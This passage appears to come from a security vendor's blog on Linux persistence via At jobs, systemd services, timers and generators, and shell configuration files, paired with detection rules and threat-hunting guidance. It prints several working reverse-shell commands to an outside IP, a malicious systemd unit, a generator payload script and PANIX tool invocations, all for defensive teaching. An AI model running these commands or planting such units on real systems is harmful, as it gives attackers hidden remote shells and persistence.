<p>An At job is defined by specifying the exact time it should run. Depending on the configuration, users can schedule At jobs with either user or root permissions. This makes At a straightforward option for scheduling tasks without the need for persistent or repeated execution, but less useful for attackers. Additionally, At is not present on most Linux distributions by-default, which makes leveraging it even less trivial. However, it is still used for persistence, so we should not neglect the technique.</p>
<p>At jobs are stored in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/spool/cron/atjobs/</code>. Besides the At job, At also creates a spool file in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/spool/cron/atspool/</code> directory. These job files contain the details of the scheduled tasks, including the commands to be executed and the scheduled times.</p>
<p>To schedule a task using At, you simply provide the command to run and the time for execution. The syntax is straightforward:</p>
<pre><code>echo &quot;/bin/bash -c &#x27;sh -i &gt;&amp; /dev/tcp/192.168.1.1/1337 0&gt;&amp;1&#x27;&quot; | at now + 1 minute</code></pre>
<p>The above example schedules a task to run one minute from the current time. The time format can be flexible, such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">at 5 PM tomorrow</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">at now + 2 hours</code>. At job details can be listed using the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">atq</code> command, and specific jobs can be removed using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">atrm</code>.</p>
<p>At is useful for one-time task scheduling and complements cron for users needing recurring and single-instance task scheduling solutions. MITRE specifies more information and real-world examples related to this technique in <a href="https://attack.mitre.org/techniques/T1053/002/">T1053.002</a>.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="persistence-through-t1053002---at" class="absolute -top-32"></span>Persistence through T1053.002 - At</h4>
<p>You can leverage the above command structure or use PANIX to set up an At job. Ensure At is installed on your system and the time settings are correct, as this might interfere with the execution.</p>
<pre><code>./panix.sh --at --default --ip 192.168.1.1 --port 2002 --time 14:49
job 15 at Tue Jun 11 14:49:00 2024
[+] At job persistence established.</code></pre>
<p>By default, depending on the privileges used to run the program, a reverse connection will be established at the time interval the user specified. Looking at the events in Discover:</p>
<p></p>
<p>We see the execution of PANIX, which is creating the At job. Next, At(d) creates two files, an At job and an At spool. At the correct time interval, the At job is executed, after which the reverse connection to the attack IP is established. Looking at these events, we have fewer behavioral coverage opportunities than we have for cron, as behaviorally, it is just <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/bin/sh</code> executing a shell command. However, we can still identify the following artifacts:</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_at_job_creation.toml">At Job Created or Modified</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr></tbody></table></div>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1053---scheduled-taskjob-honorable-mentions" class="absolute -top-32"></span>T1053 - scheduled task/job: honorable mentions</h3>
<p>Several other honorable mentions for establishing persistence through scheduled tasks/jobs include <a href="https://www.man7.org/linux/man-pages/man8/anacron.8.html">Anacron</a>, <a href="https://man.archlinux.org/man/fcron.8.en">Fcron</a>, <a href="https://manpages.ubuntu.com/manpages/xenial/man1/tsp.1.html">Task Spooler</a>, and <a href="https://man7.org/linux/man-pages/man1/batch.1p.html">Batch</a>. While these tools are less commonly leveraged by malware due to their non-default installation and limited versatility compared to cron and other mechanisms, they are still worth noting. We include behavioral detection rules for some of these in our persistence rule set. For example, Batch jobs are saved in the same location as At jobs and are covered by our &quot;<a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_at_job_creation.toml">At Job Created or Modified</a>&quot; rule. Similarly, Anacron jobs are covered through our &quot;<a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_cron_job_creation.toml">Cron Job Created or Modified</a>&quot; rule, as Anacron integrates with the default Cron persistence detection setup.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-t1053---scheduled-taskjob" class="absolute -top-32"></span>Hunting for T1053 - scheduled task/job</h3>
<p>Besides relying on Elastic’s pre-built <a href="https://github.com/elastic/detection-rules">detection</a> and <a href="https://github.com/elastic/protections-artifacts">endpoint rules</a>, a defender will greatly benefit from manual threat hunting. As part of Elastic’s 8.14 release, the general availability of the <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/esql.html">Elasticsearch Query Language (ES|QL) language</a> was introduced. ES|QL provides a powerful way to filter, transform, and analyze data stored in Elasticsearch. For this use case, we will leverage ES|QL to hunt through all the data in an Elasticsearch stack for traces of cron, At, Anacron, Fcron, Task Spooler,<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600"> </code>and Batch persistence.</p>
<p>We can leverage the following ES|QL query that can be tailored to your specific environment:</p>
<p>This query returns 76 hits that could be investigated. Some are related to PANIX, others to real malware detonations, and some are false positives.</p>
<p></p>
<p>Dealing with false positives is crucial, as system administrators and other authorized personnel commonly use these tools. Differentiating between legitimate and malicious use is essential for maintaining an effective security posture. Accurately identifying the intent behind using these tools helps minimize disruptions caused by false alarms while ensuring that potential threats are addressed promptly.</p>
<p>Programs similar to cron also have an execution history, as all of the scripts it executes will have cron as its parent. This allows us to hunt for unusual process executions through ES|QL:</p>
<p>This example performs aggregation using a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">distinct_count</code> of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">host.id</code>. If an anomalous entry is observed, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">host_count</code> can be removed, and additional fields such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">host.name</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">user.name</code> can be added to the by section. This can help find anomalous behavior on specific hosts rather than across the entire environment. This could also be an additional pivoting opportunity if suspicious processes are identified.</p>
<p>In this case, the query returns 37 results, most of which are true positives due to the nature of the testing stack in which this is executed.</p>
<p></p>
<p>In your environment, this will likely return a massive amount of results. You may consider reducing/increasing the number of days that are being searched. Additionally, the total count of entries (cc) and host_count can be increased/decreased to make sense for your environment. Every network is unique; therefore, a false positive in one environment may not be a false positive for every environment. Additionally, the total count of entries (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cc</code>) and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">host_count</code> can be increased/decreased to make sense for your environment. Every network is unique, and therefore a false-positive in one environment may not be a false-positive in another. Adding exclusions specific to your needs will allow for easier hunting.</p>
<p>Besides ES|QL, we can also leverage Elastic’s <a href="https://www.elastic.co/docs/current/integrations/osquery_manager">OSQuery Manager integration</a>. OSQuery is an open-source, cross-platform tool that uses SQL queries to investigate and monitor the operating system&#x27;s performance, configuration, and security by exposing system information as a relational database. It allows administrators and security professionals to easily query system data and create real-time monitoring and analytics solutions. Streaming telemetry represents activity over time, while OSQuery focuses on static on-disk presence. This opens the door for detecting low-and-slow/decoupled-style attacks and might catch otherwise missed activity through telemetry hunting.</p>
<p>Information on how to set up OSQuery can be found in the <a href="https://www.elastic.co/guide/en/kibana/current/osquery.html">Kibana docs</a>, and a blog post explaining OSQuery in depth can be found <a href="https://www.elastic.co/blog/gain-upper-hand-over-adversaries-with-osquery-and-elastic">here</a>. We can run the following live query to display all of the cron files present on a particular system:</p>
<p>The following results are returned. We can see the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/cron.d/freedesktop_timesync1</code> with a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">file_last_status_change_time</code> that is recent and differs from the rest of the cron files. This is the backdoor planted by PANIX.</p>
<p></p>
<p>If we want to dig deeper, OSQuery also provides a module to read the commands from the crontab file by running the following query:</p>
<p>This shows us the command, the location of the cron job, and the corresponding schedule at which it runs.</p>
<p></p>
<p>Analyzing the screenshot, we see two suspicious reverse shell entries, which could require additional manual investigation.</p>
<p>An overview of the hunts outlined above, with additional descriptions and references, can be found in our <a href="https://github.com/elastic/detection-rules">detection rules repository</a>, specifically in the <a href="https://github.com/elastic/detection-rules/tree/main/hunting">Linux hunting subdirectory</a>. We can hunt for uncommon scheduled task file creations or unusual process executions through scheduled task executables by leveraging ES|QL and OSQuery. The <a href="https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_cron.toml">Persistence via Cron</a> hunt contains several ES|QL and OSQuery queries to aid this process.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1453---create-or-modify-system-process-systemd" class="absolute -top-32"></span>T1453 - create or modify system process (systemd)</h2>
<p><a href="https://man7.org/linux/man-pages/man1/init.1.html">Systemd</a> is a system and service manager for Linux, widely adopted as a replacement for the traditional <a href="https://manpages.debian.org/testing/sysvinit-core/init.8.en.html">SysVinit</a> system. It is responsible for initializing the system, managing processes, and handling system resources. Systemd operates through a series of unit files defining how services should be started, stopped, and managed.</p>
<p><a href="https://manpages.debian.org/jessie/systemd/systemd.unit.5.en.html">Unit files</a> have different types, each designed for specific purposes. The Service unit is the most common unit type for managing long-running processes (typically daemons). Additionally, the Timer unit manages time-based activation of other units, similar to cron jobs, but integrated into Systemd.</p>
<p>This section will discuss <a href="https://attack.mitre.org/techniques/T1543/">T1453</a> for systemd services and generators, and <a href="https://attack.mitre.org/techniques/T1053/">T1053</a> for systemd timers.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1453002---create-or-modify-system-process-systemd-services" class="absolute -top-32"></span>T1453.002 - create or modify system process: systemd services</h3>
<p>The <a href="https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files">services</a> managed by systemd are defined by unit files, and are located in default directories, depending on the operating system and whether the service is run system-wide or user-specific. The system-wide unit files are typically located in the following directories:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/run/systemd/system/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/systemd/system/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/systemd/user/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/local/lib/systemd/system/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/systemd/system/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/systemd/system/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/systemd/user/</code></li>
</ul>
<p>User-specific unit files are typically located at:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.config/systemd/user/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.local/share/systemd/user/</code></li>
</ul>
<p>A basic service unit file consists of three main sections: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[Unit]</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[Service]</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[Install]</code>, and has the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.service</code> extension. Here&#x27;s an example of a simple unit file that could be leveraged for persistence:</p>
<pre><code>[Unit]
Description=Reverse Shell

[Service]
ExecStart=/bin/bash -c &#x27;sh -i &gt;&amp; /dev/tcp/192.168.1.1/1337 0&gt;&amp;1&#x27;

[Install]
WantedBy=multi-user.target</code></pre>
<p>This unit file would attempt to establish a reverse shell connection every time the system boots, running with root privileges. More information and real-world examples related to systemd services are outlined by MITRE in <a href="https://attack.mitre.org/techniques/T1543/002/">T1543.002</a>.</p>
<p>Relying solely on persistence upon reboot might be too restrictive. Timer unit files can be leveraged to overcome this limitation to ensure persistence on a predefined schedule.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1053006---scheduled-taskjob-systemd-timers" class="absolute -top-32"></span>T1053.006 - scheduled task/job: systemd timers</h3>
<p><a href="https://wiki.archlinux.org/title/systemd/Timers">Timer units</a> provide a versatile method to schedule tasks, similar to cron jobs but more integrated with the Systemd ecosystem. A timer unit specifies the schedule and is associated with a corresponding service unit that performs the task. Timer units can run tasks at specific intervals, on specific dates, or even based on system events.</p>
<p>Timer unit files are typically located in the same directories as the service unit files and have a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.timer</code> extension. Coupling timers to services is done by leveraging the same unit file name but changing the extension. An example of a timer unit file that would activate our previously created service every hour can look like this:</p>
<pre><code>[Unit]
Description=Obviously not malicious at all

[Timer]
OnBootSec=1min
OnUnitActiveSec=1h

[Install]
WantedBy=timers.target</code></pre>
<p>Timers are versatile and allow for different scheduling options. Some examples are <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">OnCalendar=Mon,Wed,Fri 17:00:00</code> to run a service every Monday, Wednesday, and Friday at 5:00 PM, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">OnCalendar=*-*-* 02:30:00</code> to run a service every day at 2:30 AM. More details and real world examples related to Systemd timers are presented by MITRE in <a href="https://attack.mitre.org/techniques/T1053/006/">T1053.006</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1453---create-or-modify-system-process-systemd-generators" class="absolute -top-32"></span>T1453 - create or modify system process: systemd generators</h3>
<p><a href="https://manpages.debian.org/testing/systemd/systemd.generator.7.en.html">Generators</a> are small executables executed by systemd at bootup and during configuration reloads. Their main role is to convert non-native configuration and execution parameters into dynamically generated unit files, symlinks, or drop-ins, extending the unit file hierarchy for the service manager.</p>
<p>System and user generators are loaded from the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">system-generators</code>/ and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">user-generators</code>/ directories, respectively, with those listed earlier overriding others of the same name. Generators produce output in three priority-based directories: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">generator.early</code> (highest), <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">generator</code> (medium), and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">generator.late</code> (lowest). Reloading daemons will re-run all generators and reload all units from disk.</p>
<p>System-wide generators can be placed in the following directories:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/run/systemd/system-generators/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/systemd/system-generators/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/local/lib/systemd/system-generators/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/systemd/system-generators/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/systemd/system-generators/</code></li>
</ul>
<p>User-specific generators are placed in the following directories:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/run/systemd/user-generators/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/systemd/user-generators/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/local/lib/systemd/user-generators/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/systemd/user-generators/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/systemd/user-generators/</code></li>
</ul>
<p><a href="https://pberba.github.io/security/2022/02/07/linux-threat-hunting-for-persistence-systemd-generators/">Pepe Berba&#x27;s research</a> explores using systemd generators to establish persistence. One method involves using a generator to create a service file that triggers a backdoor on boot. Alternatively, the generator can execute the backdoor directly, which can cause delays if the network service is not yet started, alerting the user. Systemd generators can be binaries or shell scripts. For example, a payload could look like this:</p>
<pre><code>#!/bin/sh
# Create a systemd service unit file in the late directory
cat &lt;&lt;-EOL &gt; &quot;/run/systemd/system/generator.service&quot;
[Unit]
Description=Generator Service

[Service]
ExecStart=/usr/lib/systemd/system-generators/makecon
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOL

mkdir -p /run/systemd/system/multi-user.target.wants/
ln -s /run/systemd/system/generator.service /run/systemd/system/multi-user.target.wants/generator.service

# Ensure the script exits successfully
exit 0</code></pre>
<p>Which creates a new service (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">generator.service</code>), which in turn executes <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/systemd/system-generators/makecon</code> on boot. As this method creates a service (albeit via a generator), we will take a closer look at systemd service persistence. Let&#x27;s examine how these work in practice.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-through-t1453t1053---systemd-services-timers-and-generators" class="absolute -top-32"></span>Persistence through T1453/T1053 - systemd services, timers and generators</h3>
<p>You can manually create the unit file in the appropriate directory, reload the daemon, enable and start the service, or use PANIX to do that for you. PANIX will create a service unit file in the specified directory, which in turn runs the custom command at a one-minute interval through a timer unit file. You can also use <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--default</code> with<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600"> --ip</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--port,</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">–-timer</code>.</p>
<pre><code>sudo ./panix.sh --systemd --custom --path /etc/systemd/system/panix.service --command &quot;/usr/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.1/2003 0&gt;&amp;1&#x27;&quot; --timer
Service file created successfully!
Created symlink /etc/systemd/system/default.target.wants/panix.service → /etc/systemd/system/panix.service.
Timer file created successfully!
Created symlink /etc/systemd/system/timers.target.wants/panix.timer → /etc/systemd/system/panix.timer.
[+] Persistence established.</code></pre>
<p>When a service unit is enabled, systemd creates a symlink in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">default.target.wants/</code> directory (or another appropriate target directory). This tells systemd to start the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">panix.service</code> automatically when the system reaches the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">default.target</code>. Similarly, the symlink for the timer unit file tells systemd to activate the timer based on the schedule defined in the timer unit file.</p>
<p>We can analyze and find out what happened when looking at the documents in Kibana:</p>
<p></p>
<p>PANIX is executed, which creates the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">panix.service</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">panix.timer</code> units in the corresponding directories. Then, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemctl</code> is used to reload the daemons, after which the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">panix.timer</code> is enabled and started, enabling systemd to run the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ExecStart</code> section of the service unit (which initiates the outbound network connection) every time the timer hits. To detect potential systemd persistence, we leverage the following behavioral rules:</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_systemd_service_creation.toml">Systemd Service Created</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_systemd_scheduled_timer_created.toml">Systemd Timer Created</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_systemd_generator_creation.toml">Systemd Generator Created</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_etc_file_creation.toml">Suspicious File Creation in /etc for Persistence</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_systemd_service_started.toml">Systemd Service Started by Unusual Parent Process</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_hidden_payload_executed_via_scheduled_job.toml">Hidden Payload Executed via Scheduled Job</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_scheduled_job_executing_binary_in_unusual_location.toml">Scheduled Job Executing Binary in Unusual Location</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_scheduled_task_unusual_command_execution.toml">Scheduled Task Unusual Command Execution</a></td></tr></tbody></table></div>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-t1053t1453---systemd-services-timers-and-generators" class="absolute -top-32"></span>Hunting for T1053/T1453 - systemd services, timers and generators</h3>
<p>We can hunt for uncommon <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">service</code>/<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">timer</code>/<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">generator</code> file creations in our environment through systemd by leveraging ES|QL and OSQuery. The <a href="https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_systemd_timers.toml">Persistence via Systemd (Timers)</a> file contains several ES|QL and OSQuery queries that can help hunt for these types of persistence.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1546004---event-triggered-execution-unix-shell-configuration-modification" class="absolute -top-32"></span>T1546.004 - event triggered execution: Unix shell configuration modification</h2>
<p><a href="https://effective-shell.com/part-5-building-your-toolkit/configuring-the-shell/">Unix shell configuration files</a> are scripts that run throughout a user session based on events (e.g., log in/out, or open/close a shell session). These files are used to customize the shell environment, including setting environment variables, aliases, and other session-specific settings. As these files are executed via a shell, they can easily be leveraged by attackers to establish persistence on a system by injecting backdoors into these scripts.</p>
<p>Different shells have their own configuration files. Similarly to cron and systemd, this persistence mechanism can be established with both user and root privileges. Depending on the shell, system-wide shell configuration files are located in the following locations and require root permissions to be changed:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/profile</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/profile.d/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/bash.bashrc</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/bash.bash_logout</code></li>
</ul>
<p>User-specific shell configuration files are triggered through actions performed by and executed in the user&#x27;s context. Depending on the shell, these typically include:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.profile</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.bash_profile</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.bash_login</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.bash_logout</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.bashrc</code></li>
</ul>
<p>Once modified, these scripts ensure malicious commands are executed for every user login or logout. These scripts are executed in a <a href="https://www.thegeekstuff.com/2008/10/execution-sequence-for-bash_profile-bashrc-bash_login-profile-and-bash_logout/">specific order</a>. When a user logs in via SSH, the order of execution for the login shells is:</p>
<ol>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/profile</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.bash_profile</code> (if it exists, otherwise)</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.bash_login</code> (if it exists, otherwise)</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.profile</code> (if it exists)</li>
</ol>
